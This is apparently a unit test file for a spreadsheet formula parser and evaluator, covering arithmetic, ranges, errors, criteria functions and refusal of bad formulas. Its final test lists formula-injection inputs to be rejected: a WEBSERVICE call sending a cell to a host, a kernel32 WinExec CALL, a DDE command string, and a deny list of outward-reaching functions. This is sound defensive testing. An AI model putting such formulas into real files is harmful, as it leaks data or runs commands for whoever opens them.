import test from "node:test";
import assert from "node:assert/strict";
import {
  cellName, columnLetters, columnNumber, evaluate, isError, knownFunction, NotCalculated, parseFormula, refusedFunction, type Resolver, type Value
} from "../src/services/formulas.js";

// The formulas of a spreadsheet: read, refused when they would make a spreadsheet program complain about the file or reach
// out of it, and worked out the way a spreadsheet program works them out.

type Grid = Value[][];
const sheets: Record<string, Grid> = {
  Sheet1: [
    ["Item", "Qty", "Price", "Note"],
    ["Tea", 2, 3.5, "hot"],
    ["Milk", 1, 0.8, "cold"],
    ["Bread", 3, 2.25, "fresh"],
    ["Total", null, null, null]
  ],
  "My Sheet": [[10, 20], [30, "text"]]
};

const resolver: Resolver = {
  value: (sheet, column, row) => sheets[sheet ?? "Sheet1"]?.[row]?.[column] ?? null,
  extent: (sheet) => { const grid = sheets[sheet ?? "Sheet1"] ?? []; return { rows: grid.length, columns: Math.max(0, ...grid.map((row) => row.length)) }; },
  hasSheet: (name) => name in sheets
};

/** What a formula comes to on the grid above, or the error it comes to. */
function calc(formula: string): Value | "not worked out" {
  const parsed = parseFormula(formula);
  assert.ok(parsed.ok, `${formula}: ${parsed.ok ? "" : parsed.reason}`);
  if (!parsed.ok) return null;
  try {
    const answer = evaluate(parsed.ast, resolver, "Sheet1");
    return isError(answer) ? answer.error : answer;
  } catch (error) {
    if (error instanceof NotCalculated) return "not worked out";
    throw error;
  }
}

test("columns are counted as a spreadsheet counts them", () => {
  for (const [letters, number] of [["A", 0], ["B", 1], ["Z", 25], ["AA", 26], ["AZ", 51], ["BA", 52], ["ZZ", 701], ["AAA", 702], ["XFD", 16383]] as const) {
    assert.equal(columnNumber(letters), number, letters);
    assert.equal(columnLetters(number), letters, String(number));
    assert.equal(columnNumber(letters.toLowerCase()), number);
  }
  assert.equal(cellName(0, 0), "A1");
  assert.equal(cellName(27, 9), "AB10");
});

test("arithmetic follows the order a spreadsheet follows", () => {
  assert.equal(calc("=1+2*3"), 7);
  assert.equal(calc("=(1+2)*3"), 9);
  assert.equal(calc("=2^3^2"), 64, "left to right, as a spreadsheet does it");
  assert.equal(calc("=-2^2"), 4, "a minus sign binds tighter than a power");
  assert.equal(calc("=10/4"), 2.5);
  assert.equal(calc("=7-2-1"), 4);
  assert.equal(calc("=50%"), 0.5);
  assert.equal(calc("=200*10%"), 20);
  assert.equal(calc("=1.5e2+.5"), 150.5);
  assert.equal(calc("=+3"), 3);
  assert.equal(calc("=-B2"), -2, "a minus sign before a cell");
  assert.equal(calc("=-(1+2)*2"), -6);
  assert.equal(calc("=5--3"), 8);
  assert.equal(calc("= 1 + 2 "), 3);
});

test("what cannot be worked out is the error a spreadsheet gives", () => {
  assert.equal(calc("=1/0"), "#DIV/0!");
  assert.equal(calc('="a"+1'), "#VALUE!");
  assert.equal(calc("=SQRT(-1)"), "#NUM!");
  assert.equal(calc("=MOD(5,0)"), "#DIV/0!");
  assert.equal(calc("=AVERAGE(Sheet1!D2:D4)"), "#DIV/0!", "the average of nothing");
  assert.equal(calc("=Missing!A1"), "#REF!");
  assert.equal(calc("=1+(1/0)"), "#DIV/0!", "an error is carried through");
  assert.equal(calc("=SUM(1,1/0)"), "#DIV/0!");
});

test("text and comparisons", () => {
  assert.equal(calc('="a"&"b"&1'), "ab1");
  assert.equal(calc('="a"="A"'), true, "case does not matter");
  assert.equal(calc("=1<2"), true);
  assert.equal(calc("=2<=2"), true);
  assert.equal(calc("=2<>2"), false);
  assert.equal(calc('=2>"a"'), false, "numbers sort before text");
  assert.equal(calc('="abc"<"abd"'), true);
  assert.equal(calc('=LEN("héllo")'), 5);
  assert.equal(calc('=UPPER("ab")&LOWER("CD")'), "ABcd");
  assert.equal(calc('=TRIM("  a   b ")'), "a b");
  assert.equal(calc('=LEFT("hello",2)&RIGHT("hello",3)&LEFT("x")'), "hellox");
  assert.equal(calc('=CONCAT("a",B2,TRUE)'), "a2TRUE");
});

test("cells and ranges: the sums of a table", () => {
  assert.equal(calc("=B2*C2"), 7);
  assert.equal(calc("=SUM(B2:B4)"), 6);
  assert.equal(calc("=SUMPRODUCT(B2:B4,C2:C4)"), 2 * 3.5 + 0.8 + 3 * 2.25);
  assert.equal(calc("=AVERAGE(B2:B4)"), 2);
  assert.equal(calc("=MIN(C2:C4)"), 0.8);
  assert.equal(calc("=MAX(C2:C4)"), 3.5);
  assert.equal(calc("=MEDIAN(B2:B4)"), 2);
  assert.equal(calc("=MEDIAN(1,2,3,4)"), 2.5);
  assert.equal(calc("=PRODUCT(B2:B4)"), 6);
  assert.equal(calc("=$B$2+$c$3"), 2.8);
  assert.equal(calc("=SUM(B2:C3)"), 2 + 3.5 + 1 + 0.8, "a block of cells");
  assert.equal(calc("=SUM(C4:B2)"), 2 + 3.5 + 1 + 0.8 + 3 + 2.25, "a range given the wrong way round");
  assert.equal(calc("=SUM(B:B)"), 6, "a whole column");
});

test("text in a range is ignored by a sum, and text typed straight in is read as the number it is", () => {
  assert.equal(calc("=SUM(A2:B4)"), 6, "the item names are not added");
  assert.equal(calc('=SUM("5",2)'), 7);
  assert.equal(calc('=SUM("five",2)'), "#VALUE!");
  assert.equal(calc("=SUM(Sheet1!D2:D4)"), 0);
  assert.equal(calc("=COUNT(A2:C4)"), 6);
  assert.equal(calc('=COUNT("3",A2,4)'), 2);
  assert.equal(calc("=COUNTA(A1:D5)"), 17, "twenty cells, three of them empty");
  assert.equal(calc("=COUNTBLANK(A1:D5)"), 3);
  assert.equal(calc("=MAX(A2:A4)"), 0, "the largest of no numbers");
});

test("IF works out only what it uses, and IFERROR catches what goes wrong", () => {
  assert.equal(calc("=IF(1=1,5,1/0)"), 5);
  assert.equal(calc("=IF(1=1,5,TODAY())"), 5, "the branch that is not taken is not worked out, so what it uses cannot get in the way");
  assert.equal(calc("=IFERROR(4,TODAY())"), 4);
  assert.equal(calc("=IF(1=2,1/0,7)"), 7);
  assert.equal(calc("=IF(B2>1,\"many\",\"few\")"), "many");
  assert.equal(calc("=IF(0,1)"), false);
  assert.equal(calc("=IF(TRUE,1)"), 1);
  assert.equal(calc('=IFERROR(1/0,"none")'), "none");
  assert.equal(calc("=IFERROR(4,1/0)"), 4);
  assert.equal(calc("=AND(1<2,2<3)"), true);
  assert.equal(calc("=AND(1<2,2>3)"), false);
  assert.equal(calc("=OR(1>2,2<3)"), true);
  assert.equal(calc("=NOT(1>2)"), true);
  assert.equal(calc("=AND(TRUE,TRUE)"), true);
});

test("rounding is away from zero, as a spreadsheet does it, even where the arithmetic is a hair off", () => {
  assert.equal(calc("=ROUND(2.5,0)"), 3);
  assert.equal(calc("=ROUND(-2.5,0)"), -3);
  assert.equal(calc("=ROUND(1.005,2)"), 1.01);
  assert.equal(calc("=ROUND(1234.5678,-2)"), 1200);
  assert.equal(calc("=ROUND(2.4)"), 2);
  assert.equal(calc("=ROUNDUP(1.01,1)"), 1.1);
  assert.equal(calc("=ROUNDDOWN(-1.99,1)"), -1.9);
  assert.equal(calc("=INT(-1.5)"), -2);
  assert.equal(calc("=ABS(-3)"), 3);
  assert.equal(calc("=POWER(2,10)"), 1024);
  assert.equal(calc("=SQRT(16)"), 4);
  assert.equal(calc("=MOD(-7,3)"), 2, "the sign of the divisor, as a spreadsheet gives it");
});

test("SUMIF, COUNTIF and AVERAGEIF read their criteria the way a spreadsheet does", () => {
  assert.equal(calc('=SUMIF(B2:B4,">1")'), 5);
  assert.equal(calc('=SUMIF(A2:A4,"Milk",C2:C4)'), 0.8);
  assert.equal(calc('=SUMIF(A2:A4,"*e*",B2:B4)'), 5, "the names with an e in them: Tea (2) and Bread (3)");
  assert.equal(calc('=COUNTIF(D2:D4,"hot")'), 1);
  assert.equal(calc('=COUNTIF(D2:D4,"<>hot")'), 2);
  assert.equal(calc('=COUNTIF(A2:A4,"B*")'), 1);
  assert.equal(calc("=COUNTIF(B2:B4,2)"), 1);
  assert.equal(calc('=COUNTIF(B2:B4,">=1")'), 3);
  assert.equal(calc('=AVERAGEIF(B2:B4,">1")'), 2.5);
  assert.equal(calc('=AVERAGEIF(B2:B4,">9")'), "#DIV/0!");
});

test("another sheet is reached by its name, with quotes when it has a space in it", () => {
  assert.equal(calc("='My Sheet'!A1+Sheet1!B2"), 12);
  assert.equal(calc("=SUM('My Sheet'!A1:B2)"), 60);
  assert.equal(calc("=Sheet1!B2"), 2);
  assert.equal(calc("=SUM('Not There'!A1:A2)"), "#REF!");
});

test("what a spreadsheet program works out but this does not is said so, not guessed", () => {
  for (const formula of ["=TODAY()", '=VLOOKUP("Tea",A2:C4,2,FALSE)', "=DATE(2026,1,1)", "=INDEX(A2:A4,2)", '=TEXT(B2,"0.00")']) {
    assert.equal(calc(formula), "not worked out", formula);
  }
});

test("a formula that is not one is refused with the reason, so that no file is written that a program would complain about", () => {
  const reasons = (formula: string) => { const parsed = parseFormula(formula); return parsed.ok ? "ok" : parsed.reason; };
  assert.match(reasons("=SUM(A1;A2)"), /separated by commas, not semicolons/);
  assert.match(reasons("=SUM(A1"), /a "\)" is missing/);
  assert.match(reasons("=1+"), /ends where something was expected/);
  assert.match(reasons("="), /nothing after the = sign/);
  assert.match(reasons('="open'), /never closed/);
  assert.match(reasons("=A1:"), /needs a cell at each end/);
  assert.match(reasons("=1 2"), /"2" is not expected there/);
  assert.match(reasons("=SUM(A1:B)"), /needs a cell at each end|not a cell/);
  assert.match(reasons("=FOO(1)"), /FOO is not a function I know/);
  assert.match(reasons("=TaxRate*2"), /"TaxRate" is not a cell, a number or a function/);
  assert.match(reasons("=A1 # 2"), /"#" is not something a formula can hold/);
  assert.match(reasons("=" + "1+".repeat(5000) + "1"), /longer than a spreadsheet program takes/);
  assert.equal(reasons("=SUM(A1:A3)/COUNT(A1:A3)"), "ok");
  assert.equal(reasons("SUM(A1:A3)"), "ok", "a leading = is optional, as in a file");
});

test("a function that reaches out of the file, or runs something, is never written", () => {
  for (const formula of ['=WEBSERVICE("http://example.com/?x="&A1)', '=HYPERLINK("http://example.com","click")', '=FILTERXML(A1,"//a")', '=CALL("kernel32","WinExec","JC","calc",1)', '=REGISTER.ID("a","b")', '=IMPORTXML("x","y")', '=EXEC("calc")']) {
    const parsed = parseFormula(formula);
    assert.equal(parsed.ok, false, formula);
    if (!parsed.ok) assert.match(parsed.reason, /reaches outside the file, so it is not written/, formula);
  }
  // None of them is also a function that is known, so that adding one by mistake to the known would not let it through.
  for (const name of ["WEBSERVICE", "FILTERXML", "HYPERLINK", "CALL", "REGISTER", "REGISTER.ID", "EXEC", "SHELL", "DDE", "RTD", "ENCODEURL", "IMPORTXML", "IMPORTDATA", "IMPORTHTML", "IMPORTRANGE"]) {
    assert.equal(refusedFunction(name), true, name);
    assert.equal(knownFunction(name), false, name);
  }
  // A DDE call is not a formula this reads at all.
  assert.equal(parseFormula("=cmd|' /C calc'!A0").ok, false);
  assert.equal(parseFormula("=1+1|2").ok, false);
});

test("the functions used are reported, in capitals", () => {
  const parsed = parseFormula("=if(sum(a1:a3)>1, average(b1:b2), 0)");
  assert.ok(parsed.ok);
  if (parsed.ok) assert.deepEqual([...parsed.functions].sort(), ["AVERAGE", "IF", "SUM"]);
});
